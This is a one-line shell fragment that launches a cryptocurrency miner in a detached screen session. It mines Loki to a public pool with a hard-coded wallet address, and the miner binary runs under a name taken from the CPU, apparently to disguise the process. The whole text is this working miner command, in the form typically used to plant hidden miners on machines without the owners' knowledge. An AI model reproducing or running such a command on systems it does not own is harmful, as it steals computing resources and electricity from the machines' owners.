...
screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10113 -u solo:LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy -p adminssl -a rx/loki -k
